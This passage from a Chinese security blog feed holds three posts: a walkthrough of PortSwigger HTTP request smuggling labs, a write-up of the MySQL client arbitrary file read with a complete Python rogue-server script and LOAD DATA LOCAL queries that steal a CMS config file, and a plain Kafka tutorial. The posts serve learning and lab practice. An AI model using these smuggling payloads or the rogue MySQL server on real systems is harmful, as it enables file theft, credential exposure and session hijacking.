src="/images/2020/03/12/89e63470-6409-11ea-a731-5d1f4a3ce08c.png" alt="image20200311170700419.png"></p><p>再发送一个POST请求，就会显示这次实验的需求，GPOST方法。</p><p><img src="/images/2020/03/12/8e8007e0-6409-11ea-a731-5d1f4a3ce08c.png" alt="image20200311170830800.png"></p><pre><code>前端发送数据的时候，实验content-length来设置请求的长度，后端使用transfer-encoding来处理消息。在cl和te的模式中。默认是优先使用te。前端认为POST / HTTP/1.1Content-Length: 6Transfer-Encodin: chunkedxxxxxx0G以上为一个请求,参数长度受content-length控制。而后端接收te的模式，默认这个是一个分块请求POST / HTTP/1.1Content-Length: 6Transfer-Encodin: chunkedxxxxxx0-------------------------到此，后端认为是一个请求，而G作为下一个请求而等待G这时候再进来的请求，就会作为继续未完成的请求而连接GPOST / HTTP/1.1</code></pre><h3 id="TE-CL"><a href="#TE-CL" class="headerlink" title="TE-CL"></a>TE-CL</h3><p>实验室：<a href="https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl" target="_blank" rel="noopener">https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl</a></p><p>访问实验室，查看需求，由于说明中已经告诉我们是一个te-cl的方式。</p><p><img src="/images/2020/03/12/936b7dc0-6409-11ea-a731-5d1f4a3ce08c.png" alt="image20200312091318601.png"></p><p>构造transfer-encoding块，其中12代表0之前的字符串长度包括换行符，长度为16，十六进制就是12。最后面的0需要跟两个换行符，缺少的话会提示Invalid request。可能构造成功后，发送几次仍然显示Missing parameter，多试几次即可。</p><p><img src="/images/2020/03/12/97473150-6409-11ea-a731-5d1f4a3ce08c.png" alt="image20200312095612846.png"></p><pre><code>前端服务器使用TE块来区分。参数中12GPOST / HTTP/1.10都被认为是一个合法的块消息。而后端服务器处理中只使用CL来划分消息。导致在请求中的content-length: 4让后端服务器认为：12--------------------消息到此为一个消息GPOST / HTTP/1.10--------------------第二个请求消息从而达到请求走私的目的</code></pre><h3 id="TE-TE"><a href="#TE-TE" class="headerlink" title="TE.TE"></a>TE.TE</h3><p>此种方式是前后端服务器都支持并且默认使用te块，使用某种方式导致一端不识别te块来达到，cl-te或者te-cl的方式。</p><p>实验室：<a href="https://portswigger.net/web-security/request-smuggling/lab-ofuscating-te-header" target="_blank" rel="noopener">https://portswigger.net/web-security/request-smuggling/lab-ofuscating-te-header</a></p><p>同样是用后端服务器识别到GPOST请求方法。</p><p><img src="/images/2020/03/12/9c08ff20-6409-11ea-a731-5d1f4a3ce08c.png" alt="image20200312101007186.png"></p><p>构造混淆的te头的常用方式：</p><pre><code>1. Transfer-Encoding: xchunked2. Transfer-Encoding : chunked3. Transfer-Encoding: chunked   Transfer-Encoding: x4. Transfer-Encoding:[tab]chunked5. [space]Transfer-Encoding: chunked6. X: X[\n]Transfer-Encoding: chunked7. Transfer-Encoding   : chunked</code></pre><p>请求了多次后发现，一直提示缺少参数。</p><p><img src="/images/2020/03/12/a12f8230-6409-11ea-a731-5d1f4a3ce08c.png" alt="image20200312102005572.png"></p><p>构造错误的te块，提示无效请求，说明前端服务器很可能是te。</p><p><img src="/images/2020/03/12/a589dba0-6409-11ea-a731-5d1f4a3ce08c.png" alt="image20200312102105557.png"></p><p>重新使用以上提到的方式来尝试混淆te，尝试了几种方式，发现只有双写的情况下，可以混淆后端对te的处理。</p><p><img src="/images/2020/03/12/aa4bd080-6409-11ea-a731-5d1f4a3ce08c.png" alt="image20200312102617950.png"></p><p>也就是说前端服务器处理te块消息使用了第一个te头来当作标准解析，而后端服务器中使用了第二个te头来当作标准解析。</p><h3 id="请求走私利用"><a href="#请求走私利用" class="headerlink" title="请求走私利用"></a>请求走私利用</h3><p>上面几种情况说明了请求走私的利用方式，现在同样利用实验室来尝试一下请求走私能获取到什么。</p><p>实验室：<a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te" target="_blank" rel="noopener">https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te</a></p><h4 id="CL-TE-1"><a href="#CL-TE-1" class="headerlink" title="CL-TE"></a>CL-TE</h4><p>利用CL-TE漏洞方式，来访问前端服务器不能访问的/admin页面。同时删除carlos用户。</p><p><img src="/images/2020/03/12/1f1b2700-6417-11ea-8626-838e679dac65.png" alt="image20200312103959649.png"></p><p>尝试直接访问的时候提示页面不能访问，然后修改为cl-te的方式</p><p><img src="/images/2020/03/12/25645820-6417-11ea-8626-838e679dac65.png" alt="image20200312104623997.png"></p><p>多发送两次会发现提示</p><p><img src="/images/2020/03/12/2881ebd0-6417-11ea-8626-838e679dac65.png" alt="image20200312105204438.png"></p><p>添加localhost头。多发送几次就可以看到需要删除的用户。</p><p><img src="/images/2020/03/12/2be9f600-6417-11ea-8626-838e679dac65.png" alt="image20200312105326207.png"></p><p>构造删除的地址来发送，提示跳转302</p><p><img src="/images/2020/03/12/304a9100-6417-11ea-8626-838e679dac65.png" alt="image20200312105432606.png"></p><p>再次查看页面发送用户被删除</p><p><img src="/images/2020/03/12/34349c70-6417-11ea-8626-838e679dac65.png" alt="image20200312105610334.png"></p><h4 id="TE-TE-1"><a href="#TE-TE-1" class="headerlink" title="TE-TE"></a>TE-TE</h4><p>第二个是利用TE-CL的方式来删除用户，同样尝试一下</p><p>实验室: <a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-te-cl" target="_blank" rel="noopener">https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-te-cl</a></p><p><img src="/images/2020/03/12/39cfda50-6417-11ea-8626-838e679dac65.png" alt="image20200312105739571.png"></p><p>流程基本一致，还是需要添加localhost头</p><p><img src="/images/2020/03/12/3d1fc8a0-6417-11ea-8626-838e679dac65.png" alt="image20200312110053887.png"></p><p>查看到admin页面</p><p><img src="/images/2020/03/12/4176edc0-6417-11ea-8626-838e679dac65.png" alt="image20200312110217775.png"></p><p>执行删除用户，查看已删除。</p><p><img src="/images/2020/03/12/46effda0-6417-11ea-8626-838e679dac65.png" alt="image20200312110345830.png"></p><h4 id="请求走私重写请求"><a href="#请求走私重写请求" class="headerlink" title="请求走私重写请求"></a>请求走私重写请求</h4><p>实验室：<a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-reveal-front-end-request-rewriting" target="_blank" rel="noopener">https://portswigger.net/web-security/request-smuggling/exploiting/lab-reveal-front-end-request-rewriting</a></p><p>利用请求走私来达到访问/admin页面，但是需要添加请求头，类似xff头，但不是xff头，然后再去删除用户。</p><p><img src="/images/2020/03/12/5891cdf0-6416-11ea-ac1a-19f07685b6f0.png" alt="image20200312111010862.png"></p><p>实验室有个搜索功能，说明这个功能可能帮助我们获得需要的请求头。先访问admin页面</p><p><img src="/images/2020/03/12/60894b50-6416-11ea-ac1a-19f07685b6f0.png" alt="image20200312112425807.png"></p><p>再尝试走私请求来访问搜索，尝试了多次，添加头后终于看到了需要的请求头。而content-length的大小关系泄露出来的多少有关。</p><p><img src="/images/2020/03/12/65edc1c0-6416-11ea-ac1a-19f07685b6f0.png" alt="image20200312113305960.png"></p><p>查看到了熟悉的用户页面</p><p><img src="/images/2020/03/12/6be3a2c0-6416-11ea-ac1a-19f07685b6f0.png" alt="image20200312113552192.png"></p><p>不过删除过程中发现，如果还按照之前的方式来删除用户，会不能删除，多次尝试后发现提示不允许换行符。</p><p><img src="/images/2020/03/12/7016c520-6416-11ea-ac1a-19f07685b6f0.png" alt="image20200312114635935.png"></p><p>重新尝试发现使用GET方法来删除即可</p><p><img src="/images/2020/03/12/75631fb0-6416-11ea-ac1a-19f07685b6f0.png" alt="image20200312114612255.png"></p><h4 id="获取其他用户cookie"><a href="#获取其他用户cookie" class="headerlink" title="获取其他用户cookie"></a>获取其他用户cookie</h4><p>实验室：<a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-capture-other-users-requests" target="_blank" rel="noopener">https://portswigger.net/web-security/request-smuggling/exploiting/lab-capture-other-users-requests</a></p><p>这个实验一开始并没有get到点，查看解后才发现原来忽略了长度。</p><p>我们提交请求的时候，受害者也会提交请求，就是需要获取并显示受害者的请求来达到获取cookie的目的。</p><p><img src="/images/2020/03/12/7b736680-6416-11ea-ac1a-19f07685b6f0.png" alt="image20200312115112213.png"></p><p>提交请求后显示跳转地址</p><p><img src="/images/2020/03/12/7f3fb0c0-6416-11ea-ac1a-19f07685b6f0.png" alt="image20200312115922944.png"></p><p>查看页面的显示，从而获取用户的请求cookie</p><p><img src="/images/2020/03/12/83413bd0-6416-11ea-ac1a-19f07685b6f0.png" alt="image20200312115952305.png"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;原理&quot;&gt;&lt;a href=&quot;#原理&quot; class=&quot;headerlink&quot; title=&quot;原理&quot;&gt;&lt;/a&gt;原理&lt;/h3&gt;&lt;p&gt;原理有两篇文章写的十分详细，此处不在过多陈述。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://portswigger.net/web-se
      
    
    </summary>
    
    
      <category term="web安全" scheme="/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>MySQL客户端任意文件读取</title>
    <link href="/2020/01/MySQL%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/"/>
    <id>/2020/01/MySQL客户端任意文件读取/</id>
    <published>2020-01-20T06:15:08.000Z</published>
    <updated>2020-01-20T06:15:08.138Z</updated>
    
    <content type="html"><![CDATA[<p>最早遇到这个问题的时候，大概是刚开始做安全的时候，那时候还没意识到利用等实际价值。18年的时候记得有一个CTF题，利用的就是扫描MySQL端口来获取读文件flag。直到今天看到一位大佬的拓展文章，打算实际的去利用实践一下。</p><p><a href="https://lorexxar.cn/2020/01/14/css-mysql-chain" target="_blank" rel="noopener">https://lorexxar.cn/2020/01/14/css-mysql-chain</a></p><h3 id="LOAD-DATA-INFILE"><a href="#LOAD-DATA-INFILE" class="headerlink" title="LOAD DATA INFILE"></a><strong>LOAD DATA INFILE</strong></h3><p>LOAD DATA INFILE，作用是可以把文件读入到数据库的某个表里，如果在远程连接状态下使用了LOCAL关键字，即LOAD DATE LOCAL INFILE,那么就会从客户端读取一个本地文件，存入服务器端的table里。</p><p>如果执行<code>load data infile &quot;C:/Windows/win.ini&quot; into table test FIELDS TERMINATED BY &#39;\n&#39;;</code>提示</p><p><img src="/images/2020/01/20/e5325b10-3b4b-11ea-a659-bb8fa402ccb9.png" alt="image20200119151353641.png"></p><p>受到<code>secure_file_priv</code>的导入导出限制。</p><p>但是使用<code>load data local infile &quot;C:/Windows/win.ini&quot; into table test FIELDS TERMINATED BY &#39;\n&#39;;</code></p><p>就会把客户端的文件读取到服务端，并且不再受到<code>secure_file_priv</code>的导入导出限制。</p><p><img src="/images/2020/01/20/f1b88850-3b4b-11ea-a659-bb8fa402ccb9.png" alt="image20200119162253456.png"></p><p>也就是说只要我们伪造一个服务端，让客户端主动连接过来，这样我们就可以任意读取系统上的文件等。</p><h3 id="请求协议分析"><a href="#请求协议分析" class="headerlink" title="请求协议分析"></a>请求协议分析</h3><h4 id="登陆"><a href="#登陆" class="headerlink" title="登陆"></a>登陆</h4><p>先发送一个Greeting请求包，获取一些server信息。</p><p><img src="/images/2020/01/20/f8566920-3b4b-11ea-a659-bb8fa402ccb9.png" alt="image20200119162658492.png"></p><p>接着会发送一个认证请求包，包含账号密码</p><p><img src="/images/2020/01/20/fc5c6100-3b4b-11ea-a659-bb8fa402ccb9.png" alt="image20200119162740414.png"></p><p>后面会再接着发送一些查询请求，获取一些设置和编码信息等。</p><p><img src="/images/2020/01/20/031061e0-3b4c-11ea-a659-bb8fa402ccb9.png" alt="image20200119162840532.png"></p><h4 id="加载文件"><a href="#加载文件" class="headerlink" title="加载文件"></a>加载文件</h4><p>这时候我们点加载本地文件到test数据库中，会有三条相关的请求。第一条是发送查询语句</p><p><img src="/images/2020/01/20/0767ae10-3b4c-11ea-a659-bb8fa402ccb9.png" alt="image20200119162935498.png"></p><p>第二条是服务端返回了加载的文件地址给客户端</p><p><img src="/images/2020/01/20/0b95ee70-3b4c-11ea-a659-bb8fa402ccb9.png" alt="image20200119163231329.png"></p><p>第三条就是客户端根据返回的地址读取文件，发送给服务端</p><p><img src="/images/2020/01/20/1063ca30-3b4c-11ea-a659-bb8fa402ccb9.png" alt="image20200119163522298.png"></p><p>所以这相当于一个客户端根据服务端的返回来读取文件请求给服务端的过程，也就是服务端是一直可信的。</p><p>而此处的利用就是，当服务端不可信的时候，利用返回来读取连接的客户端的信息文件。</p><p>那么，是不是只有在加载LOAD DATA LOCAL的时候才可以进行读取客户端文件，而别的时候不行呢。官方有一句这么解释，此处翻译为中文</p><p><img src="/images/2020/01/20/140e3490-3b4c-11ea-a659-bb8fa402ccb9.png" alt="image20200119163953396.png"></p><p><strong>意思是可以在任何语句中返回具有读取权限的文件</strong>。</p><h3 id="受影响应用"><a href="#受影响应用" class="headerlink" title="受影响应用"></a>受影响应用</h3><p>server端使用如下脚本：</p><pre><code>#coding=utf-8 import socketimport logginglogging.basicConfig(level=logging.DEBUG)filename=&quot;C:\\Windows\\win.ini&quot;sv=socket.socket()sv.bind((&quot;&quot;,3306))sv.listen(5)conn,address=sv.accept()logging.info(&#39;Conn from: %r&#39;, address)conn.sendall(&quot;\x4a\x00\x00\x00\x0a\x35\x2e\x35\x2e\x35\x33\x00\x17\x00\x00\x00\x6e\x7a\x3b\x54\x76\x73\x61\x6a\x00\xff\xf7\x21\x02\x00\x0f\x80\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x70\x76\x21\x3d\x50\x5c\x5a\x32\x2a\x7a\x49\x3f\x00\x6d\x79\x73\x71\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00&quot;)conn.recv(9999)logging.info(&quot;auth okay&quot;)conn.sendall(&quot;\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00&quot;)conn.recv(9999)logging.info(&quot;want file...&quot;)wantfile=chr(len(filename)+1)+&quot;\x00\x00\x01\xFB&quot;+filenameconn.sendall(wantfile)content=conn.recv(9999)logging.info(content)conn.close()</code></pre><p>利用Navicat Premium来连接，在配置中点击测试连接，就会有返回响应</p><p><img src="/images/2020/01/20/195f4a10-3b4c-11ea-a659-bb8fa402ccb9.png" alt="image20200119171211299.png"></p><p>python2的MySQLdb</p><p><img src="/images/2020/01/20/1d4bed90-3b4c-11ea-a659-bb8fa402ccb9.png" alt="image20200119171833747.png"></p><p>不过在测试中发现python3的pymysql确不受影响</p><p><img src="/images/2020/01/20/214ba3e0-3b4c-11ea-a659-bb8fa402ccb9.png" alt="image20200119172212466.png"></p><h3 id="拓展利用"><a href="#拓展利用" class="headerlink" title="拓展利用"></a>拓展利用</h3><p>在原文中，讲述了几种针对CMS的利用，那么就看一种针对dedecms的简单利用方式。</p><pre><code>load data local infile &quot;D:\\phpstudy_pro\\WWW\\DedeCMS\\data\\common.inc.php&quot; into table dede_log FIELDS TERMINATED BY &#39;\n&#39;;</code></pre><p><img src="/images/2020/01/20/26688a00-3b4c-11ea-a659-bb8fa402ccb9.png" alt="image20200120135559523.png"></p><pre><code>select * from dede_log;</code></pre><p>使用dede默认的数据库的时候，连接信息被隐藏没有保存到数据。</p><p><img src="/images/2020/01/20/2bc49c00-3b4c-11ea-a659-bb8fa402ccb9.png" alt="image20200120140154255.png"></p><p>先更改数据库</p><pre><code>use test;load data local infile &quot;D:\\phpstudy_pro\\WWW\\DedeCMS\\data\\common.inc.php&quot; into table test.test FIELDS TERMINATED BY &#39;\n&#39;;select * from test.test;</code></pre><p><img src="/images/2020/01/20/315aa9c0-3b4c-11ea-a659-bb8fa402ccb9.png" alt="image20200120140411574.png"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;最早遇到这个问题的时候，大概是刚开始做安全的时候，那时候还没意识到利用等实际价值。18年的时候记得有一个CTF题，利用的就是扫描MySQL端口来获取读文件flag。直到今天看到一位大佬的拓展文章，打算实际的去利用实践一下。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://l
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>Kafka</title>
    <link href="/2020/01/Kafka/"/>
    <id>/2020/01/Kafka/</id>
    <published>2020-01-14T08:05:55.000Z</published>
    <updated>2020-01-16T08:16:55.346Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Kafka-简介"><a href="#Kafka-简介" class="headerlink" title="Kafka 简介"></a>Kafka 简介</h3><p>详情：<a href="http://kafka.apachecn.org/intro.html" target="_blank" rel="noopener">http://kafka.apachecn.org/intro.html</a></p><h3 id="Kafka-使用"><a href="#Kafka-使用" class="headerlink" title="Kafka 使用"></a>Kafka 使用</h3><p>简介这种网上很多的，此处不介绍了，可以查看以上ApacheCN的文档，就直接开始使用和python之间的整合。</p><p>下载当前的最新版本：</p><pre><code>wget http://archive.apache.org/dist/kafka/2.4.0/kafka_2.13-2.4.0.tgz</code></pre><p>此处没有搭建zookeeper，就直接使用kafka的便捷脚本创建节点</p><pre><code>./bin/zookeeper-server-start.sh config/zookeeper.properties</code></pre><p>如果出现错误<code>Unrecognized VM option &#39;PrintGCDateStamps&#39;</code>，可能是Java版本和Kafka版本之间的问题，尝试使用更高版本的Kafka或者其他版本的Java。</p><p>启动kafka，先复制一份需要的配置文件</p><pre><code>cp config/server.properties config/server-1.properties</code></pre><p>配置文件中</p><pre><code>broker.id=0  #必须唯一，当前只设置一个，所以暂不更改listeners=PLAINTEXT://:9092 #listeners是broker监听的地址和端口，多broker的时候需要不重复log.dirs=/tmp/kafka-logs-1 #日志，此处改为kafka-logs-1zookeeper.connect=localhost:2181  #zookeeper地址，没更改</code></pre><p>启动kafka</p><pre><code>./bin/kafka-server-start.sh config/server-1.properties</code></pre><p>一串输出后，kafka启动成功</p><p><img src="https://i.loli.net/2020/01/14/jTvtupFxArQEIoh.png" alt="1578901458153.png"></p><h4 id="创建一个主题"><a href="#创建一个主题" class="headerlink" title="创建一个主题"></a>创建一个主题</h4><pre><code>./bin/kafka-topics.sh --create --zookeeper localhost:2181 --replication-factor 1 --partitions 1 --topic test   #创建test主题,replication-factor副本数，小于集群服务器数./bin/kafka-topics.sh --list --zookeeper localhost:2181  #查看当前主题</code></pre><p><img src="https://i.loli.net/2020/01/14/VMQzbmGAuKjyHrx.png" alt="1578902209494.png"></p><h4 id="发送消息"><a href="#发送消息" class="headerlink" title="发送消息"></a>发送消息</h4><p>当在生产者发送消息的时候，消费者会显示消息</p><pre><code>./bin/kafka-console-consumer.sh --bootstrap-server localhost:9092 --topic test --from-beginning # 消费者监听，此时有生产者传入消息会显示./bin/kafka-console-producer.sh --broker-list localhost:9092 --topic test #生产者发送消息</code></pre><h4 id="多代理集群"><a href="#多代理集群" class="headerlink" title="多代理集群"></a>多代理集群</h4><p>为每个代理创建一个配置文件</p><pre><code>如上的复制配置文件cp config/server.properties config/server-1.properties修改配置文件参数config/server-1.properties:    broker.id=1    listeners=PLAINTEXT://:9093    log.dir=/tmp/kafka-logs-1</code></pre><p>启动新节点</p><pre><code>./bin/kafka-server-start.sh config/server-1.properties &amp;</code></pre><p>重新创建一个主题，然后通过生产者和消费者来处理消息，处理方式和上一样，只是需要更改不同的topic</p><h4 id="导入-导出文件"><a href="#导入-导出文件" class="headerlink" title="导入/导出文件"></a>导入/导出文件</h4><p>使用官方提高的三个配置文件，首先是Kafka Connect的配置文件，包含常用的配置，如Kafka brokers连接方式和数据的序列化格式。 其余的配置文件均指定一个要创建的连接器。这些文件包括连接器的唯一名称，类的实例，以及其他连接器所需的配置。</p><pre><code>./bin/connect-standalone.sh config/connect-standalone.properties config/connect-file-source.properties config/connect-file-sink.properties</code></pre><p>一连串输出后，提示没有test.txt文件。</p><p><img src="https://i.loli.net/2020/01/14/GvlowAIxhsKFmi3.png" alt="1578905379715.png"></p><p>创建test.txt，就可以看到对文件的处理，文件夹下就会生成test.sink.txt。</p><p><img src="https://i.loli.net/2020/01/14/rp4KibEAcl5Htog.png" alt="1578905418254.png"></p><h3 id="使用python处理消息"><a href="#使用python处理消息" class="headerlink" title="使用python处理消息"></a>使用python处理消息</h3><p>安装包</p><pre><code>pip3 install kafka-python</code></pre><p>使用文档</p><pre><code>https://kafka-python.readthedocs.io/en/master/usage.html</code></pre><h4 id="生产者代码："><a href="#生产者代码：" class="headerlink" title="生产者代码："></a>生产者代码：</h4><pre><code>from kafka import KafkaProducerfrom kafka.errors import KafkaErrorproducer = KafkaProducer(    bootstrap_servers=[        &quot;localhost:9092&quot;  ])future = producer.send(&quot;test&quot;, b&#39;I am rito yan&#39;)try:    record_metadata = future.get(timeout=10)    print(record_metadata)except KafkaError as e:    print(e)</code></pre><p>发送成功后返回</p><pre><code>RecordMetadata(topic=&#39;test&#39;, partition=0, topic_partition=TopicPartition(topic=&#39;test&#39;, partition=0), offset=3, timestamp=1578905897675, checksum=None, serialized_key_size=-1, serialized_value_size=13, serialized_header_size=-1)</code></pre><p>也可以格式化消息格式</p><pre><code>from kafka import KafkaProducerfrom kafka.errors import KafkaErrorproducer = KafkaProducer(  bootstrap_servers=[        &quot;localhost:9092&quot;  ]  #value_serializer=lambda m: json.dumps(m).encode(&#39;ascii&#39;) #生产者发送json数据)future = producer.send(&quot;test&quot;, b&#39;I am rito yan&#39;)#future = producer.send(&#39;test&#39;, {&#39;key&#39;: &#39;value&#39;})try:    record_metadata = future.get(timeout=10)    print(record_metadata)except KafkaError as e:    print(e)</code></pre><h4 id="消费者代码"><a href="#消费者代码" class="headerlink" title="消费者代码"></a>消费者代码</h4><pre><code>from kafka import KafkaConsumerconsumer = KafkaConsumer(    &quot;test&quot;,    group_id = &quot;user-test&quot;,   #群组id，消息只能被同组的一个消费者消费，所以需要定义组名    bootstrap_servers = [        &quot;localhost:9092&quot;    ]    #value_deserializer=lambda m: json.loads(m.decode(&#39;ascii&#39;)) #格式化解析格式)for message in consumer:    print(&quot;%s:%d:%d: key=%s value=%s&quot; % (message.topic, message.partition,                                          message.offset, message.key,                                          message.value))</code></pre><p>消费这运行后处于监听状态，当运行如上的生产者代码的时候，界面会显示出生产者的消息</p><p><img src="https://i.loli.net/2020/01/14/TXHazuyFBOMercZ.png" alt="1578907705145.png"></p><h3 id="项目中引用"><a href="#项目中引用" class="headerlink" title="项目中引用"></a>项目中引用</h3><p>kafka在实现过程中，消费者处于监听状态，但是项目运行时，阻塞性的监听并不可用，可以使用多线程或者其他方式来处理。</p><pre><code>def search_area():    prints = PrintThread()    prints.setDaemon(True)    prints.start()    for i in range(100,200):         time.sleep(1)         print(i)import threadingimport timefrom kafka import KafkaConsumerclass PrintThread(threading.Thread):    def run(self):        print(&quot;start.... %s&quot; %self.getName())        consumer = KafkaConsumer(            &quot;test&quot;,            group_id = &quot;user-test&quot;,   #群组id，消息只能被同组的一个消费者消费，所以需要定义组名            bootstrap_servers = [                &quot;localhost:9092&quot;            ]            #value_deserializer=lambda m: json.loads(m.decode(&#39;ascii&#39;)) #格式化解析格式        )        for message in consumer:            print(&quot;%s:%d:%d: key=%s value=%s&quot; % (message.topic, message.partition,                                                  message.offset, message.key,                                                  message.value))search_area()</code></pre><p>达到主线程不阻塞的情况下仍然可以继续监听</p><p><img src="https://i.loli.net/2020/01/14/lYfcqCXow9R2gJW.png" alt="1578987250537.png"></p><p>或者不采用监听的方式，采用主动拉取队列数据，这样一次拉取的时候可能是较大的数据，对数据量处理要求高的情况下可能会增加消息延迟堆积</p><pre><code>from kafka import KafkaConsumerconsumer = KafkaConsumer(    &quot;test&quot;,    group_id=&#39;user-test&#39;,     bootstrap_servers = [        &quot;localhost:9092&quot;    ])consumer.subscribe(topics=(&#39;test&#39;,))#  consumer.subscribe(topics=(&#39;test&#39;,&#39;test0&#39;))  #订阅多个主题msg = consumer.poll(timeout_ms=2000)  # 从kafka获取消息print(msg)for tp, messages in msg.items():    for message in messages:        print(&quot;%s:%d:%d: key=%s value=%s&quot; % (tp.topic, tp.partition,                                          message.offset, message.key,                                          message.value))</code></pre><p>但是这样做会出现多次获取重复已消费的信息，因为自动位移提交的动作是在 poll() 方法的逻辑里完成的，在每次真正向服务端发起拉取请求之前会检查是否可以进行位移提交，如果可以，那么就会提交上一次轮询的位移。单次请求的时候不能提交offset。</p><p><img src="https://i.loli.net/2020/01/14/Fex4WgyqDaQ37vM.png" alt="1578984621248.png"></p><p>添加如下手动提交已消费信息</p><pre><code>from kafka import KafkaConsumerconsumer = KafkaConsumer(    &quot;test&quot;,    group_id=&#39;user-test&#39;,     enable_auto_commit = False,    bootstrap_servers = [        &quot;localhost:9092&quot;    ])consumer.subscribe(topics=(&#39;test&#39;,))#  consumer.subscribe(topics=(&#39;test&#39;,&#39;test0&#39;))  #订阅多个主题msg = consumer.poll(timeout_ms=2000)  # 从kafka获取消息print(msg)for tp, messages in msg.items():    for message in messages:        print(&quot;%s:%d:%d: key=%s value=%s&quot; % (tp.topic, tp.partition,                                          message.offset, message.key,                                          message.value))consumer.commit()  #同步提交，直到正常或异常返回之前阻塞consumer.commit_async() #异步提交，不阻塞</code></pre><p>读取已消费信息</p><p>使用 seek方法从指定的partition和offset开始读取数据，需要记录分区和offset。</p><pre><code>#encoding:utf8from kafka import KafkaConsumer, TopicPartitionmy_topic = &quot;my.topic&quot; # 指定需要消费的主题consumer = KafkaConsumer(    bootstrap_servers = &quot;192.168.70.221:19092,192.168.70.222:19092,192.168.70.223:19092&quot;, # kafka集群地址    group_id = &quot;my.group&quot;, # 消费组id    enable_auto_commit = True, # 每过一段时间自动提交所有已消费的消息（在迭代时提交）    auto_commit_interval_ms = 5000, # 自动提交的周期（毫秒）)consumer.assign([    TopicPartition(topic=my_topic, partition=0),    TopicPartition(topic=my_topic, partition=1),    TopicPartition(topic=my_topic, partition=2)])consumer.seek(TopicPartition(topic=my_topic, partition=0), 12) # 指定起始offset为12consumer.seek(TopicPartition(topic=my_topic, partition=1), 0) # 可以注册多个分区，此分区从第一条消息开始接收# consumer.seek(TopicPartition(topic=my_topic, partition=2), 32) # 没有注册的分区上的消息不会被消费for msg in consumer: # 迭代器，等待下一条消息    print msg # 打印消息</code></pre><h3 id="部署kafka"><a href="#部署kafka" class="headerlink" title="部署kafka"></a>部署kafka</h3><p>配置好需要的参数后</p><pre><code>./bin/zookeeper-server-start.sh -daemon config/zookeeper.properties</code></pre><p>就可以看到zookeeper处于监听状态，当然zookeeper这个一般使用集群部署的节点，此处仍然是使用kafka。</p><p><img src="https://i.loli.net/2020/01/16/sQotxmScwZUjlfO.png" alt="1579162043232.png"></p><pre><code>./bin/kafka-server-start.sh -daemon config/server-1.properties</code></pre><p><img src="https://i.loli.net/2020/01/16/jQ8E2tVhCTfx4Dr.png" alt="1579162335867.png"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;Kafka-简介&quot;&gt;&lt;a href=&quot;#Kafka-简介&quot; class=&quot;headerlink&quot; title=&quot;Kafka 简介&quot;&gt;&lt;/a&gt;Kafka 简介&lt;/h3&gt;&lt;p&gt;详情：&lt;a href=&quot;http://kafka.apachecn.org/intro.ht
      
    
    </summary>
    
    
      <category term="Open Source Security" scheme="/tags/Open-Source-Security/"/>
    
  </entry>
  
</feed>
